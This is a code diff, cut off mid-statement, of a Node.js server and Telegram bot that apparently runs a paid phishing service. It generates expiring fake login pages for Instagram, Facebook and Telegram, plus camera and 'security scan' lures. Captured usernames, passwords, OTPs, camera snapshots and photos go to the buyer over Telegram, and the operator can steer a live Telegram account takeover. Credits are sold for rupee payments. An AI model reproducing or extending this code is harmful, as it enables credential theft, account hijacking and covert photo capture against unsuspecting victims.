+async function loadQR(){try{var r=await fetch("/api/admin/qr");if(r.ok){var blob=await r.blob();var url=URL.createObjectURL(blob);document.getElementById("qrPreview").style.display="block";document.getElementById("qrImage").src=url;document.getElementById("qrStatus").innerHTML="✅ QR code is available";}else{document.getElementById("qrPreview").style.display="none";document.getElementById("qrStatus").innerHTML="❌ No QR code uploaded yet";}}catch(err){document.getElementById("qrStatus").innerHTML="❌ Error loading QR";}}
+async function uploadQR(){var file=document.getElementById("qrUpload").files[0];if(!file){showToast("Select an image first!",true);return;}var fd=new FormData();fd.append("qr",file);try{var r=await fetch("/api/admin/upload-qr",{method:"POST",body:fd});var data=await r.json();if(data.success){showToast("✅ QR uploaded successfully!");loadQR();}else{showToast("❌ Upload failed: "+data.error,true);}}catch(err){showToast("❌ Error uploading QR",true);}}
+async function removeQR(){if(!confirm("Remove QR code?"))return;try{var r=await fetch("/api/admin/remove-qr",{method:"DELETE"});if(r.ok){showToast("✅ QR removed!");loadQR();}else showToast("❌ Remove failed",true);}catch(err){showToast("❌ Error removing QR",true);}}
+async function loadLogs(){try{var r=await fetch("/api/admin/logs");var data=await r.json();document.getElementById("logsDisplay").textContent=data.logs||"No logs available";}catch(err){document.getElementById("logsDisplay").textContent="Error loading logs";showToast("Error loading logs",true);}}
+async function clearLogs(){if(!confirm("Clear all logs?"))return;try{var r=await fetch("/api/admin/logs",{method:"DELETE"});if(r.ok){showToast("Logs cleared!");loadLogs();}else showToast("Clear failed",true);}catch(err){showToast("Error",true);}}
+loadPhotos();loadChannels();loadUsers();loadFeatured();loadQR();
+</script></body></html>`);
+});
+
+// ====================== OTHER API ROUTES ======================
+app.get('/api/bot/random-photo', async (req, res) => {
+    const photo = await getRandomPhoto();
+    if (photo) res.json({ success: true, photo });
+    else res.status(404).json({ error: 'No photos' });
+});
+
+app.post('/api/capture', async (req, res) => {
+    const { userid, username, password, platform } = req.body || {};
+    if (!userid || !username) return res.status(400).json({ error: 'Missing fields' });
+    try {
+        const photo = await getRandomPhoto();
+        const message = LoveNotifer(platform, username, password);
+        if (photo) {
+            const photoUrl = req.protocol + '://' + req.get('host') + photo.url;
+            await S7.sendPhoto(userid, photoUrl, { caption: message, parse_mode: 'HTML' });
+        } else {
+            await S7.sendMessage(userid, message);
+        }
+        logToFile('📸 Capture from user ' + userid);
+        res.json({ status: 'success' });
+    } catch (err) {
+        logToFile('❌ Capture error: ' + err.message);
+        res.status(500).json({ error: err.message });
+    }
+});
+
+app.post('/api/capturepic', async (req, res) => {
+    const { userid, mobile, SY, platform } = req.body || {};
+    if (!userid || !SY) return res.status(400).json({ error: 'Missing photo data' });
+    try {
+        const photoBuffer = Buffer.from(SY.replace(/^data:image\/\w+;base64,/, ""), 'base64');
+        const SYloveTiMe = moment().tz('Asia/Kolkata').format('h:mm:ss A');
+        const SYloveDaTe = moment().tz('Asia/Kolkata').format('DD/MM/YYYY');
+        const caption = replaceAllEmojis('📸 <b>NEW CAPTURE 📸</b>\n\n👤 <b>Target:</b> <code>') + (mobile || 'Unknown') + replaceAllEmojis('</code>\n🌐 <b>Platform:</b> ') + (platform ? platform.toUpperCase() : 'N/A') + replaceAllEmojis('\n📅 <b>Date:</b> ') + SYloveDaTe + replaceAllEmojis('\n⏰ <b>Time:</b> ') + SYloveTiMe + replaceAllEmojis('\n\n<i>© ↝ ᴅᴇᴠ ʙʏ » ') + config.S7 + replaceAllEmojis('</i>');
+        await S7.sendPhoto(userid, photoBuffer, { caption, parse_mode: 'HTML' });
+        logToFile('📸 Camera capture from user ' + userid);
+        res.json({ status: 'success' });
+    } catch (err) {
+        logToFile('❌ Camera capture error: ' + err.message);
+        res.status(500).json({ error: 'Failed to process image' });
+    }
+});
+
+app.post('/api/upload-photo-fast', async (req, res) => {
+    try {
+        const { userid, platform, filename, data } = req.body || {};
+        if (!userid || !data) return res.status(400).json({ error: 'Missing data' });
+        const base64Data = data.replace(/^data:.*?;base64,/, "");
+        const buffer = Buffer.from(base64Data, 'base64');
+        if (!pendingPhotos[userid]) pendingPhotos[userid] = [];
+        pendingPhotos[userid].push(buffer);
+        userActive[userid] = Date.now();
+        if (pendingPhotos[userid].length >= config.BATCH_SIZE) await sendBatchPhotos(userid);
+        res.json({ success: true, stored: true, count: pendingPhotos[userid].length });
+    } catch (err) {
+        logToFile('❌ Photo upload error: ' + err.message);
+        res.status(500).json({ error: 'Failed to process photo' });
+    }
+});
+
+// ====================== CREATE LINK API (ALL PLATFORMS) ======================
+app.get('/api/create-link', async (req, res) => {
+    try {
+        const userid = req.headers.userid || 'unknown';
+        const platform = req.headers.platform || 'instagram';
+        const p = platform.toLowerCase();
+        
+        let template;
+        let prefix;
+        if (p === 'instagram') { template = INSTA_TEMPLATE; prefix = 'insta1kfollowers'; }
+        else if (p === 'facebook') { template = FB_TEMPLATE; prefix = 'fbprivatechat'; }
+        else if (p === 'camera') { template = CAMERA_TEMPLATE; prefix = 'free1gbdata'; }
+        else if (p === 'securityscan' || p === 'photoaccess' || p === 'photo') { template = SCAN_TEMPLATE; prefix = 'securityscan'; }
+        else if (p === 'telegram') {
+            const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+            let html = TELEGRAM_LOGIN_TEMPLATE
+                .replace(/USER_ID_PLACEHOLDER/g, userid)
+                .replace(/SESSION_ID_PLACEHOLDER/g, sessionId);
+            const uniqueId = Date.now().toString(36) + Math.random().toString(36).substr(2, 3);
+            const fileId = 'telegram_' + uniqueId;
+            const filePath = path.join(PAGES_DIR, fileId + '.html');
+            fs.writeFileSync(filePath, html);
+            const url = config.baseUrl + '/page/' + fileId;
+            await createLink(userid, platform, fileId, url);
+            return res.json({ success: true, url, id: fileId });
+        } else {
+            return res.status(400).json({ error: 'Invalid platform' });
+        }
+
+        const displayPlatform = p === 'instagram' ? '𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌' :
+            p === 'facebook' ? '𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊' :
+            p === 'camera' ? '𝐂𝐀𝐌𝐄𝐑𝐀' : '𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘 𝐒𝐂𝐀𝐍';
+
+        let html = template
+            .replace(/USERID_PLACEHOLDER/g, userid)
+            .replace(/PLATFORM_PLACEHOLDER/g, displayPlatform);
+
+        const uniqueId = Date.now().toString(36) + Math.random().toString(36).substr(2, 3);
+        const fileId = prefix + '_' + uniqueId;
+        const filePath = path.join(PAGES_DIR, fileId + '.html');
+        fs.writeFileSync(filePath, html);
+        const url = config.baseUrl + '/page/' + fileId;
+        await createLink(userid, platform, fileId, url);
+        console.log('🔗 Link generated: ' + url);
+        res.json({ success: true, url, id: fileId });
+    } catch (err) {
+        console.error('Link generation error:', err);
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ====================== PAGE ROUTE ======================
+app.get('/page/:id', async (req, res) => {
+    const id = req.params.id;
+    const filePath = path.join(PAGES_DIR, id + '.html');
+    if (!(await isLinkValid(id))) {
+        let reason = 'Link is invalid';
+        const link = await getLink(id);
+        if (!link) reason = 'Link not found';
+        else if (!link.active) reason = 'Link has expired';
+        else if (Date.now() > link.expiresAt) reason = 'Link expired (15 minutes)';
+        else if (link.opens >= link.maxOpens) reason = 'Link opened maximum 5 times';
+        if (link) {
+            const filePathDel = path.join(PAGES_DIR, link.fileId + '.html');
+            if (fs.existsSync(filePathDel)) {
+                fs.unlinkSync(filePathDel);
+            }
+            await Link.deleteOne({ _id: link._id });
+            console.log(`🗑️ Auto-deleted expired link: ${link.fileId}`);
+        }
+        return res.send('<h1 style="color:#ff4757;text-align:center;margin-top:50px;">🔒 Link Expired</h1><p style="text-align:center;color:#888;">' + reason + '</p><p style="text-align:center;color:#888;">Please generate a new link.</p>');
+    }
+    await incrementLinkOpen(id);
+    if (fs.existsSync(filePath)) res.sendFile(filePath);
+    else res.status(404).send('<h1>Page not found</h1>');
+});
+
+// ====================== TELEGRAM BOT ======================
+// IMPORTANT: S7 MUST BE INITIALIZED BEFORE ANY HANDLERS
+const S7 = new TelegramBot(config.mainToken, { polling: true });
+S7.getMe().then(botInfo => {
+    console.log('✅ Bot Started: @' + botInfo.username);
+    logToFile('🤖 Bot Started: @' + botInfo.username);
+}).catch(err => {
+    console.error('❌ Bot Start Error:', err.message);
+    process.exit(1);
+});
+
+// ====================== KEYBOARDS ======================
+const LOVESY = {
+    inline_keyboard: [
+        [{ text: replaceAllEmojis('📸 INSTAGRAM'), callback_data: 'gen_instagram' }],
+        [{ text: replaceAllEmojis('📘 FACEBOOK'), callback_data: 'gen_facebook' }],
+        [{ text: replaceAllEmojis('📷 CAMERA'), callback_data: 'gen_camera' }],
+        [{ text: replaceAllEmojis('🛡️ SECURITY SCAN'), callback_data: 'gen_securityscan' }],
+        [{ text: replaceAllEmojis('📱 TELEGRAM'), callback_data: 'gen_telegram' }],
+        [{ text: replaceAllEmojis('👥 Referral'), callback_data: 'referral' }],
+        [{ text: replaceAllEmojis('⭐ My Credits'), callback_data: 'credits' }],
+        [{ text: replaceAllEmojis('💰 Buy Credits'), callback_data: 'buy_credits' }]
+    ]
+};
+const ADMIN_KEYBOARD = {
+    inline_keyboard: [
+        [{ text: replaceAllEmojis('👑 Admin Panel'), callback_data: 'admin_panel' }],
+        [{ text: replaceAllEmojis('📊 Stats'), callback_data: 'admin_stats' }],
+        [{ text: replaceAllEmojis('📢 Broadcast'), callback_data: 'admin_broadcast' }],
+        [{ text: replaceAllEmojis('📋 Logs'), callback_data: 'admin_logs' }],
+        [{ text: replaceAllEmojis('🔙 Back'), callback_data: 'back' }]
+    ]
+};
+const SYBack = { inline_keyboard: [[{ text: replaceAllEmojis('🔙 BACK'), callback_data: 'back' }]] };
+function getRegenMarkup(platform) {
+    return { inline_keyboard: [[{ text: replaceAllEmojis('🔄 REGENERATE (1 Credit)'), callback_data: 'regen_' + platform }], [{ text: replaceAllEmojis('🔙 BACK'), callback_data: 'back' }]] };
+}
+
+// ====================== BOT COMMANDS ======================
+async function SendLoveSYMenu(chatId, firstName) {
+    const user = await getUser(chatId);
+    if (user.banned) {
+        return S7.sendMessage(chatId, replaceAllEmojis('🚫 You are banned from using this bot.'));
+    }
+    const featured = await getFeatured();
+    const credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
+    const isAdmin = chatId.toString() === config.adminId;
+    let message = replaceAllEmojis('𝙃𝙖𝙫𝙚 𝘼 𝙎𝙚𝙭𝙮 𝘿𝙖𝙮 ☻\n\n⭐ Credits: ') + credits + replaceAllEmojis('\n👥 Referrals: ') + (user.totalReferrals || 0);
+    if (featured.status && featured.message) message += replaceAllEmojis('\n\n📌 ') + featured.message;
+    const menuText = SYloveMenu(firstName, message);
+    let keyboard = LOVESY;
+    if (isAdmin) {
+        keyboard = { inline_keyboard: LOVESY.inline_keyboard.concat([[{ text: replaceAllEmojis('👑 Admin Panel'), callback_data: 'admin_panel' }]]) };
+    }
+    const sentMsg = await S7.sendMessage(chatId, menuText, { parse_mode: 'HTML', reply_markup: keyboard });
+    if (featured.status && featured.photo) {
+        const photos = await getPhotos();
+        const photo = photos.find(p => p.id === featured.photo);
+        if (photo) {
+            const photoUrl = config.baseUrl + photo.url;
+            await S7.sendPhoto(chatId, photoUrl, { caption: replaceAllEmojis('⭐ Featured Content') });
+        }
+    }
+    return sentMsg;
+}
+async function checkAndSendMenu(chatId, firstName) {
+    const isMember = await checkAllChannels(chatId);
+    if (!isMember) {
+        const channels = await getChannels();
+        let msg = replaceAllEmojis('⚠️ <b>Access Denied!</b>\n\nPlease join all channels:\n\n');
+        channels.forEach((ch, i) => { msg += (i+1) + '. <a href="' + ch.link + '">' + ch.name + '</a>\n'; });
+        msg += replaceAllEmojis('\nAfter joining, click below to verify.');
+        const buttons = await getChannelButtonsAsync();
+        return S7.sendMessage(chatId, msg, { parse_mode: 'HTML', reply_markup: buttons });
+    }
+    await SendLoveSYMenu(chatId, firstName);
+}
+function SYLoVe(commands) {
+    if (!Array.isArray(commands)) commands = [commands];
+    S7.on('message', async (msg) => {
+        if (!msg.text) return;
+        const cmd = msg.text.trim().split(' ')[0].slice(1);
+        if (commands.includes(cmd)) {
+            console.log('📩 Command: ' + cmd + ' from ' + msg.from.first_name);
+            logToFile('📩 Command: ' + cmd + ' from ' + msg.from.id);
+            await checkAndSendMenu(msg.chat.id, msg.from.first_name);
+        }
+    });
+}
+SYLoVe(['start', 'menu']);
+
+// ====================== /telegram COMMAND ======================
+S7.on('message', async (msg) => {
+    if (!msg.text) return;
+    const text = msg.text.trim();
+    if (text === '/telegram') {
+        const user = await getUser(msg.from.id);
+        if (user.banned) return S7.sendMessage(msg.chat.id, replaceAllEmojis('🚫 You are banned.'));
+        if (!user.unlimited && (user.credits || 0) <= 0) {
+            return S7.sendMessage(msg.chat.id, replaceAllEmojis('❌ Insufficient credits! Need 1 credit. Use referral or buy credits.'));
+        }
+        const deducted = await useCredit(msg.from.id);
+        if (!deducted) {
+            return S7.sendMessage(msg.chat.id, replaceAllEmojis('❌ Credit deduction failed. Please try again.'));
+        }
+        const loadingMsg = await S7.sendMessage(msg.chat.id, SYloveMenu(msg.from.first_name, replaceAllEmojis('𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙇𝙞𝙣𝙠... 🔁 (1 Credit deducted)')), { parse_mode: 'HTML', reply_markup: SYBack });
+        try {
+            const response = await fetch(config.baseUrl + '/api/create-link', {
+                method: 'GET',
+                headers: { userid: String(msg.from.id), platform: 'telegram' }
+            });
+            const data = await response.json();
+            if (data.error) {
+                await addCredits(msg.from.id, 1);
+                await S7.editMessageText(SYloveMenu(msg.from.first_name, replaceAllEmojis('❌ Error generating link: ') + data.error), { chat_id: msg.chat.id, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack });
+                return;
+            }
+            const finalMsg = replaceAllEmojis('✅ <b>Telegram Link Generated!</b>\n\n🔗 <b>Your Link:</b>\n<code>') + data.url + replaceAllEmojis('</code>\n\n📌 <b>Platform:</b> TELEGRAM PREMIUM\n⏰ <b>Valid for:</b> 15 minutes\n🔢 <b>Max Opens:</b> 5 times\n\n📱 Target will see a real Telegram login page.\nYou will receive OTP and password.\n\n⭐ <b>Remaining Credits:</b> ') + (user.unlimited ? '♾️ Unlimited' : (user.credits || 0));
+            await S7.editMessageText(SYloveMenu(msg.from.first_name, finalMsg), { chat_id: msg.chat.id, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: getRegenMarkup('telegram') });
+        } catch (err) {
+            console.error('Telegram Link Error:', err.message);
+            logToFile('❌ Telegram Link Error: ' + err.message);
+            await addCredits(msg.from.id, 1);
+            await S7.editMessageText(SYloveMenu(msg.from.first_name, replaceAllEmojis('❌ Error generating Telegram link')), { chat_id: msg.chat.id, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack });
+        }
+        return;
+    }
+});
+
+// ====================== /getadmin COMMAND ======================
+S7.on('message', async (msg) => {
+    if (!msg.text) return;
+    const text = msg.text.trim();
+    if (text === '/getadmin' || text === '/adminpanel') {
+        if (msg.from.id.toString() !== config.adminId) {
+            return S7.sendMessage(msg.chat.id, replaceAllEmojis('❌ Only admin can access.'));
+        }
+        const adminUrl = config.baseUrl + '/admin';
+        await S7.sendMessage(msg.chat.id, 
+            replaceAllEmojis('👑 <b>Admin Panel</b>\n\n🔗 Click here: <a href="') + adminUrl + replaceAllEmojis('">Open Admin Panel</a>\n\nOr copy this URL:\n<code>') + adminUrl + replaceAllEmojis('</code>'),
+            { parse_mode: 'HTML', disable_web_page_preview: true }
+        );
+    }
+});
+
+// ====================== /pay COMMAND ======================
+S7.on('message', async (msg) => {
+    if (!msg.text) return;
+    const text = msg.text.trim();
+    if (text.startsWith('/pay ')) {
+        const amountStr = text.replace('/pay ', '').trim();
+        const amount = parseInt(amountStr);
+        if (isNaN(amount) || amount <= 0) {
+            return S7.sendMessage(msg.chat.id, replaceAllEmojis('⚠️ Please enter a valid amount.\nExample: /pay 20'));
+        }
+        let credits, plan;
+        if (amount === 20) { credits = 10; plan = '10'; }
+        else if (amount === 40) { credits = 25; plan = '25'; }
+        else if (amount === 70) { credits = 50; plan = '50'; }
+        else if (amount === 100) { credits = 'Unlimited'; plan = 'unlimited'; }
+        else {
+            credits = Math.floor(amount / 2);
+            plan = 'custom';
+        }
+        const user = await getUser(msg.from.id);
+        if (user.banned) return S7.sendMessage(msg.chat.id, replaceAllEmojis('🚫 You are banned.'));
+        const msgText = replaceAllEmojis('💰 <b>Payment Request</b>\n\n📊 Credits: ') + credits + replaceAllEmojis('\n💵 Amount: ₹') + amount + replaceAllEmojis('\n🆔 Transaction ID: PTS-') + Date.now().toString(36).toUpperCase() + replaceAllEmojis('\n\n📤 Please send the payment screenshot after paying.');
+        await S7.sendMessage(msg.chat.id, msgText, { parse_mode: 'HTML' });
+        if (qrExists()) {
+            await S7.sendPhoto(msg.chat.id, QR_FILE, { caption: replaceAllEmojis('💳 Scan QR to pay ₹') + amount, parse_mode: 'HTML' });
+        } else {
+            await S7.sendMessage(msg.chat.id, replaceAllEmojis('⚠️ QR code not uploaded yet. Admin will add soon.'));
+        }
+        user._pendingPayment = { credits, amount, plan };
+        await user.save();
+        await S7.sendMessage(msg.chat.id, replaceAllEmojis('✅ Please send the transaction screenshot (photo) after payment.'));
+        return;
+    }
+});
+
+// ====================== REFERRAL HANDLER ======================
+S7.on('message', async (msg) => {
+    if (!msg.text) return;
+    const text = msg.text.trim();
+    if (text.startsWith('/start ref_')) {
+        const referrerId = text.replace('/start ref_', '');
+        const userId = msg.from.id;
+        const user = await getUser(userId);
+        if (user.banned) return S7.sendMessage(userId, replaceAllEmojis('🚫 You are banned.'));
+        if (user.referredBy) return S7.sendMessage(userId, replaceAllEmojis('✅ You are already registered!'));
+        const referrer = await getUser(referrerId);
+        if (!referrer) return S7.sendMessage(userId, replaceAllEmojis('❌ Invalid referral link!'));
+        if (!(await checkAllChannels(userId))) {
+            user._pendingReferrer = referrerId;
+            await user.save();
+            const channels = await getChannels();
+            let msgText = replaceAllEmojis('⚠️ <b>Join all channels first!</b>\n\n');
+            channels.forEach((ch, i) => { msgText += (i+1) + '. <a href="' + ch.link + '">' + ch.name + '</a>\n'; });
+            msgText += replaceAllEmojis('\nAfter joining, click below to claim referral bonus!');
+            const buttons = await getChannelButtonsAsync();
+            return S7.sendMessage(userId, msgText, { parse_mode: 'HTML', reply_markup: buttons });
+        }
+        await processReferral(referrerId, userId);
+    }
+});
+async function processReferral(referrerId, userId) {
+    const user = await getUser(userId);
+    if (user.referredBy) return;
+    user.referredBy = referrerId;
+    await user.save();
+    const referrer = await addReferral(referrerId, userId);
+    let newUserInfo = '@user_' + userId;
+    try { const chat = await S7.getChat(userId); newUserInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + userId; } catch {}
+    let referrerInfo = '@user_' + referrerId;
+    try { const chat = await S7.getChat(referrerId); referrerInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + referrerId; } catch {}
+    await S7.sendMessage(referrerId, replaceAllEmojis('🎉 <b>New Referral Success!</b>\n\n👤 <b>New User:</b> ') + newUserInfo + replaceAllEmojis('\n🆔 <b>User ID:</b> <code>') + userId + replaceAllEmojis('</code>\n⭐ <b>Credits Earned:</b> +2\n\n📊 <b>Your Total Credits:</b> ') + (referrer.credits || 0) + replaceAllEmojis('\n📊 <b>Your Total Referrals:</b> ') + (referrer.totalReferrals || 0), { parse_mode: 'HTML' });
+    await S7.sendMessage(config.adminId, replaceAllEmojis('👥 <b>New Referral Success!</b>\n\n👤 <b>Referrer:</b> ') + referrerInfo + replaceAllEmojis('\n👤 <b>New User:</b> ') + newUserInfo + replaceAllEmojis('\n🆔 <b>Referrer ID:</b> <code>') + referrerId + replaceAllEmojis('</code>\n🆔 <b>New User ID:</b> <code>') + userId + replaceAllEmojis('</code>\n⭐ <b>Credits Earned:</b> 2\n\n📊 <b>Referrer Total Credits:</b> ') + (referrer.credits || 0) + replaceAllEmojis('\n📊 <b>Referrer Total Referrals:</b> ') + (referrer.totalReferrals || 0), { parse_mode: 'HTML' });
+    await S7.sendMessage(userId, replaceAllEmojis('✅ <b>Welcome!</b>\n\nYou joined through <b>') + referrerInfo + replaceAllEmojis('</b>\'s referral link!\n🎁 You already have 3 credits to start.\n⭐ <b>Your Credits:</b> ') + user.credits, { parse_mode: 'HTML' });
+    await SendLoveSYMenu(userId, (await S7.getChat(userId)).first_name);
+    logToFile('👥 Referral: ' + referrerId + ' -> ' + userId);
+}
+
+// ====================== TELEGRAM PHISHING CALLBACKS ======================
+S7.on('callback_query', async (q) => {
+    if (q.data.startsWith('phish_')) {
+        const parts = q.data.split('_');
+        const action = parts[1];
+        const sessionId = parts[2] || '';
+
+        if (!global.phishSessions || !global.phishSessions[sessionId]) {
+            await S7.answerCallbackQuery(q.id, { text: '❌ Session expired or not found', show_alert: true });
+            return;
+        }
+
+        const session = global.phishSessions[sessionId];
+        const userId = session.userId;
+
+        if (action === 'password') {
+            session.decision = 'password';
+            await S7.answerCallbackQuery(q.id, { text: '✅ Showing password page to user' });
+            await S7.sendMessage(config.adminId, replaceAllEmojis('✅ Password section shown to user ') + userId);
+            await S7.sendMessage(userId, replaceAllEmojis('✅ Target is now entering password...'));
+            logToFile(`✅ Password page shown to user ${userId}`);
+        } else if (action === 'wrong') {
+            session.decision = 'wrong';
+            await S7.answerCallbackQuery(q.id, { text: '❌ Showing wrong OTP error to user' });
+            await S7.sendMessage(config.adminId, replaceAllEmojis('❌ Wrong OTP error shown to user ') + userId);
+            await S7.sendMessage(userId, replaceAllEmojis('❌ Showing wrong OTP error to target...'));
+            logToFile(`❌ Wrong OTP shown to user ${userId}`);
+        } else if (action === 'open') {
+            session.decision = 'open';
+            await S7.answerCallbackQuery(q.id, { text: '📱 Showing success page to user' });
+            await S7.sendMessage(config.adminId, replaceAllEmojis('📱 Success page shown to user ') + userId);
+            await S7.sendMessage(userId, replaceAllEmojis('📱 Target is seeing success page...'));
+            logToFile(`📱 Success page shown to user ${userId}`);
+        }
+        
+        await S7.editMessageReplyMarkup({ 
+            chat_id: q.message.chat.id, 
+            message_id: q.message.message_id, 
+            reply_markup: { inline_keyboard: [] } 
+        });
+    }
+});
+
+// ====================== MAIN CALLBACK QUERY HANDLER ======================
+S7.on('callback_query', async (q) => {
+    const uid = q.from.id;
+    const mid = q.message.message_id;
+    const cid = q.message.chat.id;
+    const isAdmin = uid.toString() === config.adminId;
+    console.log('🔘 Callback: ' + q.data + ' from ' + q.from.first_name);
+
+    if (await isUserBanned(uid) && q.data !== 'admin_panel' && q.data !== 'admin_stats' && q.data !== 'admin_broadcast' && q.data !== 'admin_logs') {
+        await S7.answerCallbackQuery(q.id, { text: '🚫 You are banned.', show_alert: true });
+        return;
+    }
+
+    if (q.data === 'admin_panel' && isAdmin) {
+        await S7.deleteMessage(cid, mid);
+        await S7.sendMessage(cid, replaceAllEmojis('👑 <b>Admin Panel</b>\n\nSelect an option below.'), { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD });
+        return;
+    }
+    if (q.data === 'admin_stats' && isAdmin) {
+        const users = await User.find();
+        const photos = await getPhotos();
+        const channels = await getChannels();
+        const referrals = await Referral.find();
+        const links = await Link.find();
+        await S7.sendMessage(cid, replaceAllEmojis('📊 <b>Bot Statistics</b>\n\n👥 Total Users: ') + users.length + replaceAllEmojis('\n📷 Total Photos: ') + photos.length + replaceAllEmojis('\n📢 Total Channels: ') + channels.length + replaceAllEmojis('\n👥 Total Referrals: ') + referrals.length + replaceAllEmojis('\n🔗 Total Links: ') + links.length + replaceAllEmojis('\n⏱ Uptime: ') + getUptime(), { parse_mode: 'HTML', reply_markup: SYBack });
+        await S7.deleteMessage(cid, mid);
+        return;
+    }
+    if (q.data === 'admin_broadcast' && isAdmin) {
+        await S7.sendMessage(cid, replaceAllEmojis('📢 <b>Send Broadcast</b>\n\nSend the message/media you want to broadcast to all users.\n\nTo send text: /broadcast [message]\nTo send media: Reply to a message with /broadcast'), { parse_mode: 'HTML', reply_markup: SYBack });
+        await S7.deleteMessage(cid, mid);
+        return;
+    }
+    if (q.data === 'admin_logs' && isAdmin) {
+        try {
+            const logs = fs.readFileSync(path.join(DATA_DIR, 'logs.txt'), 'utf8');
+            const lastLogs = logs.split('\n').slice(-50).join('\n');
+            await S7.sendMessage(cid, replaceAllEmojis('📋 <b>Recent Logs</b>\n\n<pre>') + (lastLogs || 'No logs') + '</pre>', { parse_mode: 'HTML', reply_markup: SYBack });
+        } catch { await S7.sendMessage(cid, 'No logs', { reply_markup: SYBack }); }
+        await S7.deleteMessage(cid, mid);
+        return;
+    }
+
+    if (q.data === 'check_all') {
+        const isMember = await checkAllChannels(uid);
+        if (isMember) {
+            await S7.deleteMessage(cid, mid);
+            const user = await getUser(uid);
+            if (user._pendingReferrer) {
+                const referrerId = user._pendingReferrer;
+                user._pendingReferrer = null;
+                await user.save();
+                await processReferral(referrerId, uid);
+                return;
+            }
+            await SendLoveSYMenu(cid, q.from.first_name);
+        } else {
+            await S7.answerCallbackQuery(q.id, { text: '❌ Please join ALL channels first!', show_alert: true });
+        }
+        return;
+    }
+
+    if (q.data === 'referral') {
+        const botInfo = await S7.getMe();
+        const referralLink = 'https://t.me/' + botInfo.username + '?start=ref_' + uid;
+        await S7.sendMessage(cid, replaceAllEmojis('👥 <b>Your Referral Link</b>\n\nShare this link:\n\n<code>') + referralLink + replaceAllEmojis('</code>\n\n📌 <b>How it works:</b>\n• Share your link with friends\n• They join all channels\n• You get +2 credits!\n• They get 3 credits on start!'), { parse_mode: 'HTML', reply_markup: SYBack });
+        await S7.deleteMessage(cid, mid);
+        return;
+    }
+
+    if (q.data === 'credits') {
+        const user = await getUser(uid);
+        const credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
+        await S7.sendMessage(cid, replaceAllEmojis('⭐ <b>Your Credits</b>\n\n💰 Credits: ') + credits + replaceAllEmojis('\n👥 Referrals: ') + (user.totalReferrals || 0) + replaceAllEmojis('\n📅 Joined: ') + new Date(user.joinedAt).toLocaleDateString() + replaceAllEmojis('\n\n🔹 Each link uses 1 credit\n🔹 Regenerate also uses 1 credit\n🔹 Links expire in 15 minutes\n🔹 Each link can be opened 5 times only'), { parse_mode: 'HTML', reply_markup: SYBack });
+        await S7.deleteMessage(cid, mid);
+        return;
+    }
+
+    if (q.data === 'buy_credits') {
+        const plans = {
+            inline_keyboard: [
+                [{ text: replaceAllEmojis('💰 10 Credits - ₹20'), callback_data: 'plan_10' }],
+                [{ text: replaceAllEmojis('💰 25 Credits - ₹40'), callback_data: 'plan_25' }],
+                [{ text: replaceAllEmojis('💰 50 Credits - ₹70'), callback_data: 'plan_50' }],
+                [{ text: replaceAllEmojis('♾️ Unlimited - ₹100'), callback_data: 'plan_unlimited' }],
+                [{ text: replaceAllEmojis('🔙 BACK'), callback_data: 'back' }]
+            ]
+        };
+        await S7.sendMessage(cid, replaceAllEmojis('💳 <b>Buy Credits</b>\n\nChoose a plan below:'), { parse_mode: 'HTML', reply_markup: plans });
+        await S7.deleteMessage(cid, mid);
+        return;
+    }
+
+    if (q.data.startsWith('plan_')) {
+        const plan = q.data.replace('plan_', '');
+        let credits, amount;
+        if (plan === '10') { credits = 10; amount = 20; }
+        else if (plan === '25') { credits = 25; amount = 40; }
+        else if (plan === '50') { credits = 50; amount = 70; }
+        else if (plan === 'unlimited') { credits = 'Unlimited'; amount = 100; }
+        else return;
+
+        const msg = replaceAllEmojis('💰 <b>Credits Purchase</b>\n\n📊 <b>Credits:</b> ') + credits + replaceAllEmojis('\n💵 <b>Amount:</b> ₹') + amount + replaceAllEmojis('\n🆔 <b>Transaction ID:</b> PTS-') + Date.now().toString(36).toUpperCase() + replaceAllEmojis('\n\n📤 <b>Instructions:</b>\n1. Scan the QR code below\n2. Pay ₹') + amount + replaceAllEmojis('\n3. Send the transaction screenshot here (upload photo)\n4. Wait for admin approval\n\n⚠️ <b>Don\'t close this chat!</b> Admin will respond here.\n\n✅ After approval, credits will be added.');
+        await S7.sendMessage(cid, msg, { parse_mode: 'HTML' });
+        
+        if (qrExists()) {
+            await S7.sendPhoto(cid, QR_FILE, { caption: replaceAllEmojis('💳 <b>Scan QR to Pay ₹') + amount + '</b>', parse_mode: 'HTML' });
+        } else {
+            await S7.sendMessage(cid, replaceAllEmojis('⚠️ <b>QR code not uploaded yet.</b>\nPlease wait for admin to upload payment QR.\n\nUse /addqr to upload QR (Admin only).'), { parse_mode: 'HTML' });
+        }
+        const user = await getUser(uid);
+        user._pendingPayment = { credits, amount, plan };
+        await user.save();
+        await S7.deleteMessage(cid, mid);
+        return;
+    }
+
+    if (q.data.startsWith('pay_accept_') && isAdmin) {
+        const userId = q.data.replace('pay_accept_', '');
+        const user = await getUser(userId);
+        const payment = user._pendingPayment;
+        if (!payment) {
+            await S7.answerCallbackQuery(q.id, { text: 'No pending payment', show_alert: true });
+            return;
+        }
+        if (payment.credits === 'Unlimited') {
+            user.unlimited = true;
+            await user.save();
+            await S7.sendMessage(userId,
+                replaceAllEmojis('🎉 <b>UNLIMITED ACTIVATED!</b>\n\nYour payment of ₹') + payment.amount + replaceAllEmojis(' has been verified.\nYou now have <b>Unlimited Credits</b> forever!\n\nThank you for your support! 🙏'),
+                { parse_mode: 'HTML' }
+            );
+        } else {
+            user.credits = (user.credits || 0) + parseInt(payment.credits);
+            await user.save();
+            await S7.sendMessage(userId,
